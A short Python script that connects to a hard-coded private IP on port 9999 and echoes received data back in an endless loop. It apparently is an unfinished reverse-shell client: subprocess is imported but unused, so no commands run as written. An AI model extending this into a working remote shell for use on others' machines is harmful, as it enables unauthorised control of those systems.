import os
import socket
import subprocess

host = "192.168.43.164"
s = socket.socket()
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if(len(data)>0):
        output_str= str(data,'utf-8')
        s.send(str.encode(output_str))
        

s.close()

